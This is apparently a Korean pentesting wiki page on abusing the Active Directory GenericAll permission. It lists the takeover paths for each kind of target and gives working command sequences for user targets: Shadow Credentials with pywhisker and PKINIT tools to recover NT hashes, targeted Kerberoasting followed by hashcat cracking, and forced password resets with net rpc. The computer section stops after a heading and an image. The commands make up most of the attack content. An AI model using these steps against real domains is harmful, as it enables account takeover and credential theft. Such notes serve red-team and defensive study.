# GenericAll

* 대상의 거의 모든 액티브 디렉토리 특성을 READ/WRITE 할 수 있는 권한. 사실상 대상의 소유권한(Owner Rights)을 가지고 있는 것이나 다름 없다. 대상의 종류와 상관 없이 (유저, 컴퓨터, 그룹, 도메인) 사실상 대상을 바로 장악할 수 있다.
* 공식 액티브 디렉토리 권한

대상에 따라 `GenericAll` DACL을 악용할 수 있는 방법도 다르다.&#x20;

* 유저: 계정 장악
* 컴퓨터: 머신 계정 장악 + 로컬 관리자 권한 획득
* 그룹: 그룹에 공격자 유저 추가
* 도메인: DCSync 기능 사용 가능

<figure><img src="../../.gitbook/assets/genericAll-FullControl.png" alt=""><figcaption></figcaption></figure>

## 악용 - 유저&#x20;

<figure><img src="../../.gitbook/assets/bh-generic-all-user-comp (1).png" alt=""><figcaption></figcaption></figure>

1. Shadow Credentials: `msDS-KeyCredentialsLink` 에 공격자 공개 키를 추가한 뒤, PKINIT을 이용해 사용자 인증을 한다
2. Targeted Kerberoast: 대상 유저 계정에 SPN을 추가한 뒤 해당 유저만 Kerberoasting 공격을 실행한다
3. Force Change Password: 대상 유저 계정의 비밀번호를 강제로 바꾼다



### Shadow Credentials

```
# ShadowCredentials 공격 
pywhisker.py -d domain.local -u controlledAccount -p pass --target targetAccount --action add

python3 gettgtpkinit.py -cert-pfx <pfx> -pfx-pass <pass> domain.com/target target.ccache
export KRB5CCNAME=target.ccache
python3 getnthash.py -key <AS-REP Encryption key> domain.com/target

# 공격자로서 추가했던 DeviceID만 삭제 
python3 pywhisker.py -d choi.local -u abuse -p 'Password123!' --target victim --action remove -D <DeviceID>

# 확인 
python3 pywhisker.py -d choi.local -u abuse -p 'Password123!' --target victim --action list
```

### Targeted Kerberoast

```
git clone https://github.com/ShutdownRepo/targetedKerberoast.git

python3 targetedKerberoast.py -v -d domain.com -u attacker -p pass --request-user targetUser --only-abuse

hashcat -a 0 -m 13100 <hash> <wordlist> 
```

### Force Change Password

```
# 윈도우 머신 필요. TODO: Impacket이나 다른 툴 알아보기 
net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"
```



## 악용 - 컴퓨터&#x20;

<figure><img src="../../.gitbook/assets/bh-generic-all-user-comp.png" alt=""><figcaption></figcaption></figure>



